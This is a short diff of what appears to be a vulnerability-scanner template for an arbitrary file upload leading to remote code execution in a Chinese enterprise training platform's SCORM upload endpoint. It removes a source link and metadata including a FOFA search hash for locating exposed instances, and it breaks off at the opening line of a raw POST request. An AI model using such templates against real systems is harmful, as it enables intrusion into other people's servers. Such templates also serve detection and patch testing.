@@ -3,12 +3,8 @@ info:
   name: 内训宝企业培训平台 scorm 任意文件上传导致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gpgba668ygawbtoi'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gpgba668ygawbtoi
-    fofa: icon_hash="-790843908"
 http:
 - raw:
   - 'POST /upload/scorm HTTP/1.1
